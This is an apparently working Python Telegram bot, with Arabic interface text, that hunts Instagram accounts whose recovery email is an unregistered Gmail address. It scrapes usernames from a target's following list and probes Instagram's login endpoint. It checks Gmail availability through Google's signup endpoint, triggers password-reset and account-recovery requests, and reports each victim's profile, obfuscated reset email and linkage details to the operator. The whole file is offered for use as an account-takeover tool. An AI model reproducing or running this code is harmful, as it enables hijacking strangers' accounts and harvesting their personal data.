import os
try:
    import telebot
except ImportError as error:
    os.system('pip install pyTelegramBotAPI')
    print('install done..')
    exit()
    
import requests
import json
import time
from datetime import date
import telebot
from telebot import types
import os
a = 0
b =0
j =0
us =0
h =0
L=0
c =0
m =0
today = date.today()
token =input('Enter Your Token Bot : ')
bot = telebot.TeleBot(token)
@bot.message_handler(commands=['start'])
def start(message):
    try:
        fio = open('username.txt','r').read().splitlines()
    except FileNotFoundError as error:
        with open('username.txt','a') as fo:
            fo.write('')
        start = types.InlineKeyboardButton(text='START - ابدء',callback_data='start')
        st = types.InlineKeyboardMarkup(row_width=2)
        st.add(start)
        bot.send_message(message.chat.id,text='اهلا بك في بوت صيد المتاحات 🤖\nاضغط على START 📶\n\nمبرمج البوت @BBPZZ 🚼',reply_markup=st)
    
       
    start = types.InlineKeyboardButton(text='START - ابدء',callback_data='start')
    st = types.InlineKeyboardMarkup(row_width=2)
    st.add(start)
    bot.send_message(message.chat.id,text='اهلا بك في بوت صيد المتاحات 🤖\nاضغط على START 📶\n\nمبرمج البوت @BBPZZ 🚼',reply_markup=st)
@bot.callback_query_handler(func=lambda call:True)
def call(call):
    if call.data=='start':
        se= types.InlineKeyboardButton(text='اضف سيشن ايدي',callback_data='se')
        ch = types.InlineKeyboardButton(text='بدء صيد',callback_data='ch')
        list = types.InlineKeyboardButton(text='سحب لستة',callback_data='list')
        de = types.InlineKeyboardButton(text='حذف ملفات',callback_data='de')
        ds = types.InlineKeyboardMarkup(row_width=2)
        ds.add(se,list,ch,de)
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='اختار مايناسبك من القائمة 👁‍🗨',reply_markup=ds)
    elif call.data=='se':
        rg = types.InlineKeyboardButton(text='رجوع - 🔙',callback_data='start')
        rg1 = types.InlineKeyboardMarkup(row_width=2)
        rg1.add(rg)
        message = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='حسنا الان ارسل السيشن ايدي من فضلك لكي اقوم بحفظة',reply_markup=rg1)
        bot.register_next_step_handler(message,n1,message.id)
    elif call.data =='de':
        rm = types.InlineKeyboardButton(text='حذف سيشن ايدي',callback_data='rm')
        rm1 = types.InlineKeyboardButton(text='حذف لستة يوزرات',callback_data='rm1')
        rg = types.InlineKeyboardButton(text='رحوع للخلف',callback_data='start')
        ty = types.InlineKeyboardMarkup(row_width=2)
        ty.add(rm,rm1,rg)
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='اختار احد الازار التالية',reply_markup=ty)
    elif call.data=='rm':
        os.remove('sessoinid.json')
        rg = types.InlineKeyboardButton(text='رجوع - 🔙',callback_data='start')
        rg1 = types.InlineKeyboardMarkup(row_width=2)
        rg1.add(rg)
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='تم حذف اللستة بنجاح, لستة السيشن ايدي بنجاح',reply_markup=rg1)
    elif call.data=='rm1':
        os.remove('username.txt')
        rg = types.InlineKeyboardButton(text='رجوع - 🔙',callback_data='start')
        rg1 = types.InlineKeyboardMarkup(row_width=2)
        rg1.add(rg)
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='تم حذف اللستة بنجاح..تم حذف لستة اليوزرات بنجاح',reply_markup=rg1)
    elif call.data=='list':
        sessoinid3=str(json.loads(open('sessoinid.json','r').read())["sessoinid"])
        if sessoinid3=='False':
            rh = types.InlineKeyboardButton(text='رجوع - ↩️',callback_data='start')
            dj = types.InlineKeyboardMarkup(row_width=2)
            dj.add(rh)
            bot.edit_message_text(chat_id=message.chat.id,message_id=id,text='عليك اضافة سيشن ايدي اولا..',reply_markup=dj)
        else:
            
            rg = types.InlineKeyboardButton(text='رجوع - 🔙',callback_data='start')
            rg1 = types.InlineKeyboardMarkup(row_width=2)
            rg1.add(rg)
            message= bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='حسنا الان ارسل اليوزر كي اقوم بسحب لستة لك..',reply_markup=rg1)
            bot.register_next_step_handler(message,n2,message.id)
    elif call.data =='ch':
        rg = types.InlineKeyboardButton(text='رجوع - ↩️',callback_data='start')
        rg1 = types.InlineKeyboardMarkup(row_width=2)
        rg1.add(rg)
        message = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='ارسل كلمة Bot حتى يبدء الصيد',reply_markup=rg1)
        bot.register_next_step_handler(message,n3,message.id)

def n1(message,id):
    sessoinid1 = str(message.text)
    se = {"sessoinid": f'{sessoinid1}'}
    json1 = json.dumps(se)
    open('sessoinid.json','w').write(json1)
    #bot.send_message(message.chat.id,'تم اضافة السيشن ايدي بنجاح\n')
    rh = types.InlineKeyboardButton(text='رجوع - ↩️',callback_data='start')
    dj = types.InlineKeyboardMarkup(row_width=2)
    dj.add(rh)
    bot.edit_message_text(chat_id=message.chat.id,message_id=id,text='تم اضافة السيشن ايدي بنجاح..',reply_markup=dj)
def n2(message,id):
    global a,b,j,h,c,m,us
    user1=str(message.text)
    sessoinid2=str(json.loads(open('sessoinid.json','r').read())["sessoinid"])
    if sessoinid2 =='False':
        rh = types.InlineKeyboardButton(text='رجوع - ↩️',callback_data='start')
        dj = types.InlineKeyboardMarkup(row_width=2)
        dj.add(rh)
        bot.edit_message_text(chat_id=message.chat.id,message_id=id,text='عليك اضافة سيشن ايدي اولا..',reply_markup=dj)
    else:
        
        print(sessoinid2)
        url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(user1)
        head2={
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
            'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'viewport-width': '917',
            'x-asbd-id': '198387',
            'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
            'x-instagram-ajax': '1006627630',
            'x-requested-with': 'XMLHttpRequest'
        }
        ge = requests.get(url2,headers=head2).json()
        pr = ge['data']['user']['is_private']
        idd= ge['data']['user']['id']
        fols = ge['data']['user']['edge_follow']['count']
        if pr =='True':
            bot.send_message(message.chat.id,'الحساب الذي ارسلتة خاص لايمكن سحب لستة')
        else:
            
            fols1 = int(fols)
            url =f'https://www.instagram.com/api/v1/friendships/{idd}/following/?count='+f'{fols1}'
            head22={
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={sessoinid2}',
                'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                'viewport-width': '917',
                'x-asbd-id': '198387',
                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                'x-instagram-ajax': '1006627630',
                'x-requested-with': 'XMLHttpRequest'
            }
            
            try:
                geg= requests.get(url,headers=head22).json()
            except requests.exceptions.JSONDecodeError as error:
                bot.send_message(message.chat.id,'السيشن ايدي الخاص بك خطا - غير شغال')
            for i in range(0,fols):
                try:
                    try:
                        us = geg['users'][i]['username']
                        with open('username.txt','a') as f8:
                            f8.write(f'{us}@gmail.com\n')
                        a+=1
                        li = types.InlineKeyboardButton(text=f'تم السحب ',callback_data='li')
                        li1 = types.InlineKeyboardButton(text=f'{a}',callback_data='li1')
                        lis = types.InlineKeyboardButton(text=f'اليوزرات',callback_data='lis')
                        lis1 = types.InlineKeyboardButton(text=f"{us}",callback_data='lis1')
                        er1 = types.InlineKeyboardButton(text=f"{b}",callback_data='er1')
                        er = types.InlineKeyboardButton(text=f'خطا',callback_data='er')
                        ui = types.InlineKeyboardMarkup(row_width=2)
                        ui.add(li1,li,lis1,lis,er1,er)
                        bot.edit_message_text(chat_id=message.chat.id,message_id=id,text='جار سحب اللستة .. عليك الانتظار',reply_markup=ui)
                    except KeyError as error:
                        b+=1
                except IndexError as error:
                    user = us
                    user1= user
                    n2(user1)
def n3(message,id):
    global a,b,j,h,c,m,us,today,L
    iw = str(message.text)
    if ('Bot') in iw or ('BOT') in iw or ('bot') in iw:
        try:
            fi = open('username.txt','r').readline()
        except FileNotFoundError as error:
            jx = types.InlineKeyboardButton(text='رجوع - ↩️',callback_data='start')
            jxc = types.InlineKeyboardMarkup(row_width=3)
            jxc.add(jx)
            bot.edit_message_text(chat_id=message.chat.id,message_id=id,text='انت لم تقوم بسحب لستة , عليك سحب لستة حتى تتمكن من استخدام هذا الازر',reply_markup=jxc)
        
        if ('[]') in fi:
            jx = types.InlineKeyboardButton(text='رجوع - ↩️',callback_data='start')
            jxc = types.InlineKeyboardMarkup(row_width=3)
            jxc.add(jx)
            bot.edit_message_text(chat_id=message.chat.id,message_id=id,text='ملف اليوزرات فارغ لا يمكن قرائتة...\nيجب ان يحتوي على مجموعة من اليوزرات حتى يتمكن البوت من قرائتة',reply_markup=jxc)
            
        else:
            fii = open('username.txt','r').read().splitlines()
            line = len(open('username.txt','r').readlines())
            for username in fii:
                print(username)
                
                url ='https://www.instagram.com/api/v1/web/accounts/login/ajax/'

                head1 = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-length': '291',
                        'content-type': 'application/x-www-form-urlencoded',
                        'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=3x61mpjHJv4QQhugwS2lvBGqsWQuQYFa; ds_user_id=499476691',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'none',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'x-csrftoken': '3x61mpjHJv4QQhugwS2lvBGqsWQuQYFa',
                        'viewport-width': '917'
                }
                tim = str(time.time()).split('.')[0]
                data = {
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:wjdjwdjwjdwjdjwdj1212',
                    'username': f'{username}',
                    'queryParams': '{}',
                    'optIntoOneTap': 'false',
                    'trustedDeviceRecords': '{}'
                }
                
                rf = requests.post(url,headers=head1,data=data).text
                if ('"user":true,') in rf:
                    url4 ='https://accounts.google.com/_/signup/webusernameavailability?hl=en&_reqid=33779&rt=j'
                    headers4 ={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-length': '1299',
                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                        'cookie': 'SEARCH_SAMESITE=CgQI25YB; OTZ=6862229_44_44__44_; ACCOUNT_CHOOSER=AFx_qI7Dy8Pyt2P_UQzwmtt-gcxIA1SUCW5h8MOMVG6X3vuShK9bYgQyVJgD5Sc7RiJ_dVJUcqqMSmgrL8PbbEbq9RnibRvhUJNnG4jlgNiApCU6D-yGyYSnZFjftBKzUNCNS3egHZdtFQgie2PwQyE-0GJOatIggDiDiAOdpCq-MvRavq5m5sUooqBnncGn3fKFwRkhGhC4RW7n3mL59cluUxXFDeUgk_vJWZ9FEKd2gFTSaumDeJbwpjiy1LS_Yio1QvtwKBY4oC2-K843sdLyxEv7wPTKaQ; 1P_JAR=2023-02-12-06; AEC=ARSKqsJpSDqAQ8_d_ueJ10-FYYC6jwHNZ-o8PA8gZ_8zO9aHSb68IrNtmw; NID=511=MvSazwKX9swgyYD9EGvp-jNz-VqUTYSG98pvXFUwHi21HZ65BeuLze_MyXgbtqmKT5ZdMaxmM-_9F_w82FaC-Iapyu8lOkCoTm4Xa_drU7ZAPnUqvQJg5auA0TwVW_J4YjbJw75osjkQVrnH-SlMLPtYaZvbTeRzpBl4Xf-YZMqmasOhOt506eBRVT4JOex5VIkKZ1rlKdvku1AnipDGz5GwWcBQsAqLdHx5aqc-N7u9FpalfP--HZljHWVls9y5TjlDpQUehbG8EclYXEus8fjXFYqr619wz-8cUQpFVKXR; __Host-GAPS=1:5i6teqapVnumoCVriw_N_kEWYxm5shSKMeU7ttNb-yF8JceaEWIj8xpBmHhUmrZg9rJH7g8zYMBuKpQEEtdPz8z2b5mK_8lCNn8ulWf3wZ2-Gpx0kIbNROQCzH9rqA:EGm-kxIXSIMcZsu_',
                        'google-accounts-xsrf': '1',
                        'origin': 'https://accounts.google.com',
                        'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?continue=http%3A%2F%2Fsupport.google.com%2Fmail%2Fanswer%2F56256%3Fhl%3Den&hl=en&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp',
                        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                        'sec-ch-ua-arch': '"x86"',
                        'sec-ch-ua-bitness': '"64"',
                        'sec-ch-ua-full-version': '"110.0.5481.77"',
                        'sec-ch-ua-full-version-list': '"Chromium";v="110.0.5481.77", "Not A(Brand";v="24.0.0.0", "Google Chrome";v="110.0.5481.77"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-model': '',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-ch-ua-platform-version': '"10.0.0"',
                        'sec-ch-ua-wow64': '?0',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                        'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=40581379-e9d2-4653-bf08-33a0d05aa850,signin_mode=all_accounts,signout_mode=show_confirmation',
                        'x-client-data': 'CIi2yQEIo7bJAQjEtskBCKmdygEIqJbLAQiVocsBCO2CzQEI9orNAQj/i80BCJCMzQEI2IzNAQjIjc0BCNONzQEI0uGsAg==',
                        
                        
                        
                        'x-same-domain': '1'
                    }
                    data4 ={
                        'continue': 'http://support.google.com/mail/answer/56256?hl=en',
                        'hl': 'en',
                        'f.req': f'["AEThLlxj0v24tQyp9EvqjRMi7NsULTVS301h2rUpMQbeWQsDaQuG3JtiMzQVZjkZgCFMP9cwInqVD-n2rbyUHZ1SER_wX0fUvnuzLtqHRyIGXfYYjBDl0COcfKTt504pXxe2YLp52merILFtxS9LX6oWsp0-EXgS-2v4PPtMMLZqYI5nYowehk2jfVTyj63GjtHyyjdlyuzN6NvA9ngbpHuep0jjfHyltQ","cdckdk","cdkckd","{username}",false,"S-368275141:1676182919914955",1]',
                        'azt': 'AFoagUWcGwerb8F-H7GjsbYgTuj9F5vFqA:1676182919935',
                        'cookiesDisabled': 'false',
                        'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"40581379-e9d2-4653-bf08-33a0d05aa850",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,false,1,""]',
                        'gmscoreversion': 'undefined'
                        
                    }
                    r4 = requests.post(url4,headers=headers4,data=data4).text
                    if ('"EmailInvalid"') in r4:
                        b+=1
                    elif ('"gf.wuar",2,') in r4:
                        b+=1
                    elif ('"gf.wuar",1') in r4:
                        nn = username.split('@')[0]
                        a+=1
                        url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(nn)
                        head2={
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9',
                            'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                            'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                            'sec-ch-prefers-color-scheme': 'light',
                            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                            'viewport-width': '917',
                            'x-asbd-id': '198387',
                            'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            'x-ig-app-id': '936619743392459',
                            'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                            'x-instagram-ajax': '1006627630',
                            'x-requested-with': 'XMLHttpRequest'
                        }
                        ge = requests.get(url2,headers=head2).json()
                        try:
                                            
                            idd = ge['data']['user']['id']
                            fol = ge['data']['user']['edge_followed_by']['count']
                            bio = ge['data']['user']['biography']
                            fols = ge['data']['user']['edge_follow']['count']
                            img = ge['data']['user']['profile_pic_url']
                            nam = ge['data']['user']['full_name']
                            pr = ge['data']['user']['is_private']
                            post = ge['data']['user']['edge_owner_to_timeline_media']['count']
                            img = ge['data']['user']['profile_pic_url']
                            
                        except KeyError as error:
                            us+=1
                        rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={idd}")
                        ree = rl.json()
                        da = ree['date']
                        headers = {
    # 'Content-Length': '305',
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'Host': 'i.instagram.com',
                            'Connection': 'Keep-Alive',
                            'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',
                            # Requests sorts cookies= alphabetically

                            'Accept-Language': 'en-US',
                            'X-IG-Connection-Type': 'WIFI',
                            'X-IG-Capabilities': 'AQ==',
                            # 'Accept-Encoding': 'gzip',
                        }
                        data = {
                            'ig_sig_key_version': '4',
                            "user_id":idd
                        }
                        res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
                        rs =str(res['obfuscated_email'])
                        urlr='https://www.instagram.com/accounts/account_recovery_ajax/'
                        headr= {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9',
                            'content-length': '336',
                            'content-type': 'application/x-www-form-urlencoded',
                            'cookie': 'mid=YuPxZAABAAEUVYcD2B0cFEzLEyuU; ig_did=50092572-86B8-4779-8D7D-ED783D6BE001; dpr=3; datr=lPHjYm79ZCBQZ-8kyLncySC7; shbid="572\05454072972258\0541691059333:01f70b5caa78629654a33ffe9055bdc7663b824064ba3854ecfade7109c72ee455eb5eb8"; shbts="1659523333\05454072972258\0541691059333:01f7ce1fd97040b48210c72b760bfbbf68254544b85860f356f3dc04622ee5bfd6edb2d9"; rur="RVA\05454072972258\0541691069797:01f7513337be7c4309672fc0a95436c4f0b60d9f1ff74355b61efadb1b1079fb38505eea"; csrftoken=tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
                            'origin': 'https://www.instagram.com',
                            'referer': 'https://www.instagram.com/',
                            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
                            'viewport-width': '30',
                            'x-asbd-id': '437806',
                            'x-csrftoken': 'tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
                            'x-ig-app-id': '936619743392459',
                            'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
                            'x-instagram-ajax': 'caee87137ae9',
                            'x-requested-with': 'XMLHttpRequest'
                        }
                        datar={
                            'query': f'{username}'
                        }
                        rq = requests.post(urlr,headers=headr,data=datar).json()
                        try:
                            B19 =f"{username}"
                            fa =str(rq['options']['can_use_facebook'])
                            if fa =='True':
                                L3 = 'مرتبط في الفيس بوك'
                            else:
                                L3='غير مرتبط في الفيس بوك'
                            ph = str(rq['options']['can_send_phone'])
                            if ph =='True':
                                L5 = ('مرتبط برقم')
                            else:
                                L5='غير مرتبط برقم'
                        except KeyError as Error:
                            L7 ='الريست لا يعمل'
                        
                        j+=1
                        try:
                            uq=(f'''🗿 ⌯ زيد گريمـ جآبلگ صـيد 🚸\n🏴‍☠️|⌯رقمـ آلصـيد : {j}\n📟 ⌯ آسـمـ آلمـسـتخدمـ : {nn}\n🗞️ ⌯ آلآسـمـ : {nam}\n📧 ⌯ آلبريد : {nn}@gmail.com\n👥 ⌯ عددآلمـتآبعين : {fol}\n🚻 ⌯ يتآبع : {fols}\n🗺 ⌯ عدد آلمـنشـور : {post}\n⌛️ ⌯ تآريخ آنشـآء آلحسـآب : {da}\n🔐 ⌯ خصـوصـية آلحسـآب : {pr}\n🛡️ ⌯ آلفيسـبوگ : {L3}\n📲 ⌯ رقمـ آلهہآتف : {L5}\n🔁 ⌯ ريسـت آلحسـآب : يعمل\n🗝 ⌯ ريسـت آلبآسـورد : {rs}\n⌚️ ⌯ تآريخ آلصـيد  : {today}\n♜ ⌯ حقوق : @BBPZZ - @BBMZZ
    ♜ ⌯ برمـجة زيد كريم ☢️''')
                            bot.send_photo(message.chat.id,img,f'{uq}')
                        except UnboundLocalError as error:
                            L+=1
                            uq=(f'''🗿 ⌯ زيد گريمـ جآبلگ صـيد 🚸\n🏴‍☠️|⌯رقمـ آلصـيد : {j}\n📟 ⌯ آسـمـ آلمـسـتخدمـ : {nn}\n🗞️ ⌯ آلآسـمـ : {nam}\n📧 ⌯ آلبريد : {nn}@gmail.com\n👥 ⌯ عددآلمـتآبعين : {fol}\n🚻 ⌯ يتآبع : {fols}\n🗺 ⌯ عدد آلمـنشـور : {bio}\n⌛️ ⌯ تآريخ آنشـآء آلحسـآب : {da}\n🔐 ⌯ خصـوصـية آلحسـآب : {pr}\n⌚️ ⌯ تآريخ آلصـيد  : {today}\n♜ ⌯ حقوق : @BBPZZ - @BBMZZ
    ♜ ⌯ برمـجة زيد كريم ☢️''')
                            bot.send_photo(message.chat.id,img,f'{uq}')
                elif ('"Sorry, your password was incorrect. Please double-check your password."') in rf:
                    
                    m+=1
                    number = int(m+b+a)
                    ha = types.InlineKeyboardButton(text='🟢 تم الصيد',callback_data='ha')
                    ha1 = types.InlineKeyboardButton(text=f'{a}',callback_data='ha1')
                    bad = types.InlineKeyboardButton(text=f'🔴 غير مرتبط',callback_data='bad')
                    bad1 = types.InlineKeyboardButton(text=f'{m}',callback_data='bad1')
                    er = types.InlineKeyboardButton(text=f'🟡 غير متاح',callback_data='er')
                    er1 = types.InlineKeyboardButton(text=f'{b}',callback_data='er1')
                    num = types.InlineKeyboardButton(text=f'{number}/{line}',callback_data='num')
                    bd = types.InlineKeyboardMarkup(row_width=2)
                    bd.add(ha1,ha,bad1,bad,er1,er,num)
                    bot.edit_message_text(chat_id=message.chat.id,message_id=id,text='جار الصيد الان عليك الانتظار فقط..',reply_markup=bd)
            bot.send_message(message.chat.id,'تم انتهاء الفحص.')
    else:
        jk = types.InlineKeyboardButton(text='رجوع - 🔙',callback_data='start')
        jk1 = types.InlineKeyboardMarkup(row_width=2)
        jk1.add(jk)
        bot.edit_message_text(chat_id=message.chat.id,message_id=id,text='ارسل احد الكلمات التالية :\n\n1 - Bot\n2 - BOT\n3 - bot\nحتى تتمكن من استخدام هذا الزر',reply_markup=jk1)
        
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(e)
		time.sleep(10)
  
